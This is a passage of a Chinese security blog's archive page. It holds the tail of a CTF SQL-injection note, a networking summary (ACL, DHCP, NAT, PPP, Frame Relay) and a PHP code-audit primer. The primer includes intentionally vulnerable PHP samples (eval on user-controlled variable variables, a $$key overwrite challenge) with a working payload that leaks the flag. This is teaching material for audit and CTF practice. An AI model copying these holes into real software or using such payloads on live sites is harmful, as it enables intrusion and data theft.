class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>MySQL 的 show、rename 和 alter 命令</p>
<ol>
<li>show 可以用于查看当前数据库，当前表，以及表中的字段</li>
<li>rename 用于修改 table 的名称</li>
<li>alter 用于修改表中字段的属性</li>
</ol>
</li>
<li><p>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了</p>
</li>
</ol>
<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/04/策略及服务和广域网/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/04/策略及服务和广域网/" itemprop="url">计算机网络总结(四)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-04T16:12:52+08:00">
                2019-06-04
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
<li>Access Control List 访问控制列表</li>
<li>作为过滤器时，应用在接口上的，必须挂在一个接口上</li>
<li>一般有两个接口，出口和入口，一个接口最多挂 2 个 ACL，一个方向上最多挂一个 ACL</li>
</ul>
<h2 id="Why-Use-ACLs"><a href="#Why-Use-ACLs" class="headerlink" title="Why Use ACLs"></a>Why Use ACLs</h2><ul>
<li>Filtering : Manage IP traffic by filtering packets passing through a router</li>
<li>Classification : Identify traffic for special handling</li>
</ul>
<blockquote>
<p>用于过滤流量时单独使用，用于分类时配合其他协议或应用使用</p>
</blockquote>
<h2 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h2><ul>
<li>Permit or deny packets moving through the router</li>
<li>Permit or deny vty access to re from the router</li>
</ul>
<blockquote>
<p>一般可以检查到第 4 层，可以理解为一个包过滤防火墙，但不是一个专业的防火墙</p>
</blockquote>
<h2 id="Classification"><a href="#Classification" class="headerlink" title="Classification"></a>Classification</h2><ul>
<li>Special handing for traffic based on packet tests</li>
</ul>
<blockquote>
<p>就是为其他协议提供分类服务，而不丢弃数据包</p>
</blockquote>
<h2 id="Outbound-ACL-Operation"><a href="#Outbound-ACL-Operation" class="headerlink" title="Outbound ACL Operation"></a>Outbound ACL Operation</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/27.png" alt></p>
<blockquote>
<p>ACL Test：只要匹配一个就立即执行这个条件所规定的动作，不再匹配下面的</p>
</blockquote>
<h2 id="Types-of-ACLS"><a href="#Types-of-ACLS" class="headerlink" title="Types of ACLS"></a>Types of ACLS</h2><ul>
<li>Standard ACL<ul>
<li>Checks source address</li>
<li>Generally permits or denies entire protocol suite</li>
<li>Slow speed</li>
</ul>
</li>
<li>Extended ACL<ul>
<li>Checks source and destination address</li>
<li>Generally permits or denies specific protocols and applications</li>
<li>Fast speed</li>
</ul>
</li>
<li>Identify standard and extended ACLs<ul>
<li>Use a number</li>
<li>Use a name</li>
</ul>
</li>
</ul>
<blockquote>
<p>Standard : 1-99, 1300-1999</p>
<p>Extended : 100-199, 2000-2699</p>
</blockquote>
<h2 id="Wildcard-Bits-Check-the-corresponding-address-bits"><a href="#Wildcard-Bits-Check-the-corresponding-address-bits" class="headerlink" title="Wildcard Bits : Check the corresponding address bits"></a>Wildcard Bits : Check the corresponding address bits</h2><ul>
<li>0 代表匹配，1 代表忽略</li>
<li>Matches all bits : 0.0.0.0</li>
<li>Ignore all bits : 255.255.255.255</li>
<li>Example : <ul>
<li>Address : 172.30.16.0</li>
<li>Wildcard mask : 0.0.15.255</li>
<li>前 16 位必须是 170.30，15 表示只检查第三个八位组的前四位，必须和 Address 一样 0001，255 表示第四个八位组不匹配</li>
</ul>
</li>
</ul>
<h2 id="Testing-Packets-with-Numbered-Extended-ACLs"><a href="#Testing-Packets-with-Numbered-Extended-ACLs" class="headerlink" title="Testing Packets with Numbered Extended ACLs"></a>Testing Packets with Numbered Extended ACLs</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/28.png" alt></p>
<h1 id="DHCP-Service"><a href="#DHCP-Service" class="headerlink" title="DHCP Service"></a>DHCP Service</h1><h2 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h2><ul>
<li>DHCP is built on a client-server model</li>
<li>Use UDP protocol with port 67,68</li>
<li>Support <em>automatic allocation</em>, <em>dynamic allocation</em> and <em>manual allocation</em></li>
</ul>
<blockquote>
<p>这是内网服务</p>
</blockquote>
<h2 id="DHCP-Process"><a href="#DHCP-Process" class="headerlink" title="DHCP Process"></a>DHCP Process</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/29.png" alt></p>
<blockquote>
<p>discover message : 发现 DHCP 服务器，广播发送</p>
<p>offer message : 包含已分配的 IP 地址，单播发送</p>
<p>request message : 确认 IP 地址无问题，广播发送( DHCP 服务器不一定是一个，告诉网络中所有的 DHCP 服务器使用哪个 IP 地址 )</p>
<p>ack message : 确认消息，单播发送</p>
</blockquote>
<h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><h2 id="Network-Address-Translation"><a href="#Network-Address-Translation" class="headerlink" title="Network Address Translation"></a>Network Address Translation</h2><ul>
<li>网络地址转换，用于修改 IP 数据包中的源、目标地址，比如内网地址转换为外网地址</li>
<li>为何使用 NAT 技术<ul>
<li>节省 IP 地址( NAT + VLSM/CIDR )</li>
<li>可以隐藏内部真实 IP，隐藏了源地址</li>
<li>NAT TCP 负载均衡</li>
<li>解决地址冲突问题</li>
</ul>
</li>
</ul>
<h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><ul>
<li>影响路由器性能</li>
<li>破坏了 IP 的端到端特性</li>
<li>与一些安全协议不兼容</li>
</ul>
<h2 id="NAT-分类"><a href="#NAT-分类" class="headerlink" title="NAT 分类"></a>NAT 分类</h2><ul>
<li>静态 NAT<ul>
<li>一对一转换</li>
<li>手工创建 NAT 映射表</li>
</ul>
</li>
<li>动态 NAT<ul>
<li>一对一转换</li>
<li>定义地址池，动态创建 NAT 映射表</li>
</ul>
</li>
<li>PAT<ul>
<li>多对一转换</li>
<li>通过端口号标识不同数据流</li>
</ul>
</li>
</ul>
<blockquote>
<p>一般静态 NAT 和 动态 NAT 用于解决地址冲突，一般 PAT 用于节约 IP 地址</p>
<p>可以是内网地址转换为外网地址，也可以是外网地址转换为外网地址</p>
</blockquote>
<h2 id="PAT"><a href="#PAT" class="headerlink" title="PAT"></a>PAT</h2><ul>
<li>为每一个数据流分配一个端口号</li>
<li>出口是同一个出口，通过分配的端口号识别数据流，并且会记录外部地址和外部端口号</li>
</ul>
<h1 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h1><h2 id="WAN"><a href="#WAN" class="headerlink" title="WAN"></a>WAN</h2><h3 id="WANs-vs-LANs"><a href="#WANs-vs-LANs" class="headerlink" title="WANs vs. LANs"></a>WANs vs. LANs</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/30.png" alt></p>
<h3 id="WAN-Services"><a href="#WAN-Services" class="headerlink" title="WAN Services"></a>WAN Services</h3><ul>
<li>Physical : Electrical, mechanical, operational connections</li>
<li>Data Link : Frame Relay, ATM, HDLC</li>
</ul>
<blockquote>
<p>一般广域网只影响 OSI 的后两层，不影响上层</p>
</blockquote>
<h3 id="Physical-Layer-WANs"><a href="#Physical-Layer-WANs" class="headerlink" title="Physical Layer: WANs"></a>Physical Layer: WANs</h3><ul>
<li>底层一般用串行接口,比如 s0/0</li>
<li>设备分为 DTE 和 DCE，客户端是 DTE 端，DCE 端提供传输所需要的信息</li>
</ul>
<h3 id="WAN-Data-Link-Protocols"><a href="#WAN-Data-Link-Protocols" class="headerlink" title="WAN Data-Link Protocols"></a>WAN Data-Link Protocols</h3><ul>
<li>HDLC</li>
<li>PPP：ADSL，3G，GPRS，CMDA</li>
<li>Frame Relay</li>
<li>ATM</li>
<li>ISDN</li>
</ul>
<h3 id="WAN-Link-Options"><a href="#WAN-Link-Options" class="headerlink" title="WAN Link Options"></a>WAN Link Options</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/31.png" alt></p>
<h3 id="WAN-分类"><a href="#WAN-分类" class="headerlink" title="WAN 分类"></a>WAN 分类</h3><ul>
<li>Closed Network<ul>
<li>专有网络，应用于银行，军队，政府</li>
</ul>
</li>
<li>Open Network<ul>
<li>开放网络，比如Internet</li>
</ul>
</li>
</ul>
<blockquote>
<p>Internet 属于广域网，广域网不仅仅是 Internet</p>
</blockquote>
<h2 id="Internet-Connection"><a href="#Internet-Connection" class="headerlink" title="Internet Connection"></a>Internet Connection</h2><h3 id="DSL-Service-Types-Overview"><a href="#DSL-Service-Types-Overview" class="headerlink" title="DSL Service Types Overview"></a>DSL Service Types Overview</h3><ul>
<li>一般家庭和中小型企业使用 DSL 接入互联网</li>
</ul>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/32.png" alt></p>
<h3 id="ADSL"><a href="#ADSL" class="headerlink" title="ADSL"></a>ADSL</h3><ul>
<li>上行速率低，下行速率高</li>
<li>属于一层技术</li>
<li>可以在传统的电话线上传输</li>
<li>上层协议为 PPP 协议</li>
</ul>
<h2 id="Serial-Encapsulation"><a href="#Serial-Encapsulation" class="headerlink" title="Serial Encapsulation"></a>Serial Encapsulation</h2><h3 id="Typical-WAN-Encapsulation-Protocols"><a href="#Typical-WAN-Encapsulation-Protocols" class="headerlink" title="Typical WAN Encapsulation Protocols"></a>Typical WAN Encapsulation Protocols</h3><ul>
<li>Leased Line</li>
<li>Packet Switching</li>
<li>Circuit Switching</li>
<li>Metro Ethernet</li>
<li>Broadband</li>
</ul>
<h3 id="Circuit-Switching"><a href="#Circuit-Switching" class="headerlink" title="Circuit Switching"></a>Circuit Switching</h3><ul>
<li>需要建立连接( 拨号的过程 )，而且建立连接比较慢</li>
<li>专属线路</li>
<li>连接速率比较低</li>
<li>一般基于 PSTN( Public Switched Telephone Network )</li>
</ul>
<h3 id="Leased-Line"><a href="#Leased-Line" class="headerlink" title="Leased Line"></a>Leased Line</h3><ul>
<li>专线，比如光纤</li>
<li>速度快，连接简单，质量高</li>
<li>费用高</li>
</ul>
<h3 id="Leased-Line-Encapsulation-Protocols"><a href="#Leased-Line-Encapsulation-Protocols" class="headerlink" title="Leased Line Encapsulation Protocols"></a>Leased Line Encapsulation Protocols</h3><ul>
<li>平常所说的以太网是应用于局域网中，不再适用于广域网</li>
<li>对于专线连接，二层通常需要一些特殊的协议。二层的封装不再是以太网封装，就没有 MAC 地址了</li>
<li>一般默认是 HDLC，但是一般厂商都会改装成私有协议，这样就只适用于相同厂商的设备连接</li>
<li>对于不同厂商的设备连接，一般使用 PPP 协议，它是一个标准协议</li>
</ul>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/33.png" alt></p>
<h3 id="ATM-and-Cell-Switching"><a href="#ATM-and-Cell-Switching" class="headerlink" title="ATM and Cell Switching"></a>ATM and Cell Switching</h3><ul>
<li>将数据分为 53 字节的定长数据进行处理</li>
<li>一般数据处理在硬件中完成，速率很快</li>
<li>通常用于运营商的内部网络</li>
</ul>
<h1 id="PPP"><a href="#PPP" class="headerlink" title="PPP"></a>PPP</h1><h3 id="Features-2"><a href="#Features-2" class="headerlink" title="Features"></a>Features</h3><ul>
<li>它是一个标准协议</li>
<li>在广域网中应用范围最广的一个二层协议</li>
<li>分为 NCP 和 LCP 两个部分</li>
<li>广泛用于宽带连接，Internet 连接</li>
</ul>
<h3 id="PPP-LCP-Options"><a href="#PPP-LCP-Options" class="headerlink" title="PPP LCP Options"></a>PPP LCP Options</h3><ul>
<li>Authentication：二层认证机制</li>
<li>Callback：回拨</li>
<li>Compression：二层压缩机制</li>
<li>Multilink：多链路</li>
</ul>
<h3 id="Laying-PPP-Elements"><a href="#Laying-PPP-Elements" class="headerlink" title="Laying PPP Elements"></a>Laying PPP Elements</h3><p>LCP : 底层协议，用于建立连接、解除连接和连接认证</p>
<p>NCP : 上层协议，在三层和底层之间做一个衔接</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/34.png" alt></p>
<h3 id="PAP"><a href="#PAP" class="headerlink" title="PAP"></a>PAP</h3><ul>
<li>PPP authentication protocol</li>
<li>Passwords sent in plaintext</li>
</ul>
<blockquote>
<p>单向认证，一方请求认证，一方提交用户名密码</p>
</blockquote>
<h3 id="CHAP"><a href="#CHAP" class="headerlink" title="CHAP"></a>CHAP</h3><ul>
<li>PPP authentication protocol</li>
<li>Hash values, not actual passwords, are sent across the link</li>
</ul>
<blockquote>
<p>双方都要进行认证，一个类似于三次握手的过程</p>
</blockquote>
<h1 id="Frame-Relay"><a href="#Frame-Relay" class="headerlink" title="Frame Relay"></a>Frame Relay</h1><h2 id="Features-3"><a href="#Features-3" class="headerlink" title="Features"></a>Features</h2><ul>
<li>帧中继协议是二层协议</li>
<li>早期企业用于替代专线线路的方法</li>
<li>长距离传输</li>
<li>使用了虚拟电路(virtual circuits)，将一个线路分为多个虚拟线路，分别分给用户，使用 VC 区分不同用户 </li>
<li>不支持广播和组播，只支持单播</li>
</ul>
<h2 id="Frame-Relay-Terminology"><a href="#Frame-Relay-Terminology" class="headerlink" title="Frame Relay Terminology"></a>Frame Relay Terminology</h2><ul>
<li>VC 分为 SVC(交换虚链路，临时分配地址) 和 PVC(永久虚链路，固定地址)</li>
<li>帧中继通过 DLCI 号标识 VC，可以把 DLCI 理解为帧中继的二层编址，只具有本地意义，即只存在于两个设备之间，可以重复</li>
<li>帧中继封装分为 Cisco 和 IETF 封装</li>
<li>LMI( 本地管理接口 ) : 两个帧中继设备之间使用的信令标准，可以理解为两种设备之间所说的语言</li>
</ul>
<h2 id="Address-Mapping"><a href="#Address-Mapping" class="headerlink" title="Address Mapping"></a>Address Mapping</h2><ul>
<li>三层使用 IP 地址，二层使用 DLCI 号，这样就存在一个从 IP 地址到 DLCI 号的映射</li>
<li>这个映射使用 Inverse ARP 来实现动态映射</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/03/PHP代码审计基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/03/PHP代码审计基础/" itemprop="url">PHP代码审计(一)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-03T18:58:57+08:00">
                2019-06-03
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="常见-PHP-框架"><a href="#常见-PHP-框架" class="headerlink" title="常见 PHP 框架"></a>常见 PHP 框架</h1><ul>
<li>ThinkPHP</li>
<li>Yaf</li>
<li>Laravel</li>
<li>Kohana</li>
<li>Codelgniter</li>
<li>Yii</li>
<li>Smyfony</li>
<li>doitphp</li>
</ul>
<blockquote>
<p>先看用户手册</p>
</blockquote>
<h1 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h1><p>获取请求 =》全局过滤 =》模块文件 =》C函数内容 =》M函数内容 =》V显示</p>
<h1 id="网站目录结构"><a href="#网站目录结构" class="headerlink" title="网站目录结构"></a>网站目录结构</h1><ul>
<li><p>主目录</p>
</li>
<li><p>模块目录</p>
</li>
<li><p>插件目录</p>
</li>
<li><p>上层目录</p>
</li>
<li><p>模板目录</p>
</li>
<li><p>数据目录</p>
</li>
<li><p>配置目录</p>
</li>
<li><p>配置文件</p>
</li>
<li><p>公共函数文件</p>
</li>
<li><p>安全过滤文件</p>
</li>
<li><p>数据库结构</p>
</li>
<li><p>入口文件</p>
</li>
</ul>
<h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><h2 id="通读原文"><a href="#通读原文" class="headerlink" title="通读原文"></a>通读原文</h2><ul>
<li>函数集文件</li>
<li>配置文件</li>
<li>安全过滤文件</li>
<li>index 文件</li>
</ul>
<blockquote>
<p>适用于比较小的网站或者 CMS</p>
</blockquote>
<h2 id="敏感关键字回溯参数"><a href="#敏感关键字回溯参数" class="headerlink" title="敏感关键字回溯参数"></a>敏感关键字回溯参数</h2><p>这是常见方法，但是不能了解程序的基本框架，覆盖不了逻辑漏洞</p>
<h2 id="查找可控变量"><a href="#查找可控变量" class="headerlink" title="查找可控变量"></a>查找可控变量</h2><ul>
<li><p>可控变量</p>
</li>
<li><p>进入函数的变量</p>
</li>
</ul>
<h2 id="功能点定向审计"><a href="#功能点定向审计" class="headerlink" title="功能点定向审计"></a>功能点定向审计</h2><ul>
<li>程序安装</li>
<li>文件上传</li>
<li>文件管理</li>
<li>登陆验证</li>
<li>备份恢复</li>
<li>找回密码</li>
</ul>
<h1 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ul>
<li>大小写敏感</li>
<li>运算符：|, &amp;, ~, !</li>
<li>空值：foo = ; 或者 foo = none;</li>
</ul>
<h2 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h2><ul>
<li><p>安全模式</p>
<p><code>safe_mode = off</code></p>
<p>限制文档的存取，限制环境变量的存取，控制外部程序的执行</p>
<p>在 PHP5.4.0 被移除</p>
</li>
<li><p>限制环境变量存取</p>
<p><code>safe_mode_allowed_env_vars = string</code></p>
<p>指定 PHP 程序可以改变的环境变量的前缀</p>
</li>
<li><p>外部程序执行目录</p>
<p><code>safe_mode_exec_dir = &quot;path&quot;</code></p>
</li>
<li><p>禁用函数</p>
<p><code>disable_functions =</code> </p>
</li>
</ul>
<h2 id="控制变量"><a href="#控制变量" class="headerlink" title="控制变量"></a>控制变量</h2><ul>
<li><p>全局变量注册开关</p>
<p><code>register_globals = off</code></p>
<p>off 时服务端使用 $_GET[‘name’] 获取数据，on 时服务端通过 POST 或 GET 提交的数据将使用全局变量来接收</p>
</li>
<li><p>魔术引号自动过滤</p>
<p><code>magic_quotes_gpc = on</code></p>
<p>在 PHP5.4.0 被移除</p>
</li>
</ul>
<h2 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h2><ul>
<li><p>是否允许包含远程文件</p>
<p><code>allow_url_include = off</code></p>
</li>
<li><p>是否允许打开远程文件</p>
<p><code>allow_url_open = off</code></p>
</li>
</ul>
<h2 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h2><ul>
<li><p>HTTP 头部版本信息</p>
<p><code>expose_http = off</code></p>
</li>
<li><p>文件上传临时目录</p>
<p><code>upload_tmp_dir =</code> </p>
</li>
<li><p>用户可访问目录</p>
<p><code>open_basedir = path</code></p>
</li>
</ul>
<h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><ul>
<li><p>内部错误选项</p>
<p><code>display_errors = on</code></p>
</li>
<li><p>错误报告级别</p>
<p><code>error_reporting = E_ALL&amp;~E_NOTICE</code></p>
</li>
</ul>
<h1 id="审计中涉及的超全局变量"><a href="#审计中涉及的超全局变量" class="headerlink" title="审计中涉及的超全局变量"></a>审计中涉及的超全局变量</h1><ul>
<li><p>全局变量</p>
<p>在函数外面定义的变量，不能在函数中直接使用。在函数中使用时加上global</p>
</li>
<li><p>超全局变量</p>
<p>作用域在所有脚本，比如$_GET，$_SERVER。除$_GET, $_POST, $_SERVER, $_COOKIE等之外的超全局变量保存在 $GLOBALS 数组中</p>
</li>
</ul>
<h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><ul>
<li><p>global</p>
<p>定义全局变量，只应用于当前网页而不是整个网站，可以视为参数的传递</p>
</li>
<li><p>$GLOBALS</p>
<p>在 PHP 脚本中的任意位置访问全局变量，可以视为变量的作用域设置全局</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var1 = <span class="number">1</span>;</span><br><span class="line">$var2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$GLOBALS[<span class="string">'var1'</span>] = $GLOBALS[<span class="string">'var2'</span>];</span><br><span class="line">&#125;</span><br><span class="line">test1();</span><br><span class="line"><span class="keyword">echo</span> $var1;	<span class="comment">//2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $var1,$var2;</span><br><span class="line">	$var1 = $var2</span><br><span class="line">&#125;</span><br><span class="line">test2();</span><br><span class="line"><span class="keyword">echo</span> $var1;	<span class="comment">//2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="POST-和-GET"><a href="#POST-和-GET" class="headerlink" title="$_POST 和 $_GET"></a>$_POST 和 $_GET</h2><ul>
<li><p>POST</p>
<p>隐藏传参，将表单内各个字段与其内容放在 Request Header 内传给服务器</p>
</li>
<li><p>GET</p>
<p>URL 传参，将参数放在提交表单的 ACTION 属性所指的 URL 中</p>
</li>
</ul>
<h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><ul>
<li>PHP 中 $_REQUEST 可以获取 以 POST 和 GET 方法提交的数据</li>
<li>尽量不要使用</li>
</ul>
<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><ul>
<li>这种超全局变量保存关于报头、路径和脚本位置的信息</li>
<li>数组</li>
</ul>
<h2 id="FILE"><a href="#FILE" class="headerlink" title="$_FILE"></a>$_FILE</h2><ul>
<li>保存上传文件的信息</li>
<li>数组</li>
</ul>
<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><ul>
<li>保存 SESSION 信息</li>
<li>数组</li>
</ul>
<h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><ul>
<li>保存 COOKIE 信息</li>
<li>数组</li>
</ul>
<h2 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h2><ul>
<li>包含服务器环境变量的数组</li>
<li>只是被动的接受服务器端的环境变量转换为数组</li>
</ul>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul>
<li>变量未初始化，我们自定义的参数值可以替换程序原有的变量值</li>
</ul>
<h2 id><a href="#" class="headerlink" title="$$"></a>$$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x = <span class="string">'123'</span>;</span><br><span class="line">$b = <span class="string">'456'</span>;</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$x);"</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($x);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>变量 x 初始化为 ‘123’</p>
<p>传入参数 ?x=b，$$x 就相当于 $b，这时的输出为 string(3) “456”，string(1) “b”</p>
<p>传入参数 ?x=x=789，$$x 相当于 ${x=789}，这时输出为 int(789)，int(789)，x 值以被覆盖</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"CTF is here :p…"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：?_200=flag post：flag=1</p>
<p>通过 $$key=$$value 将 flag 的值赋给 _200，post 中的 flag 为：${flag}=1，所以 post 的值永远和 $flag 相同，接着利用 die($_200) 将真实的 flag 输出</p>
<h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><blockquote>
<p>extract(<em>array,extract_rules,prefix</em>)</p>
</blockquote>
<p>extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，创建这些变量。该函数返回成功设置的变量数目。</p>
<p>extract_rules 参数：</p>
<ul>
<li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li>
<li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li>
<li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</li>
<li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</li>
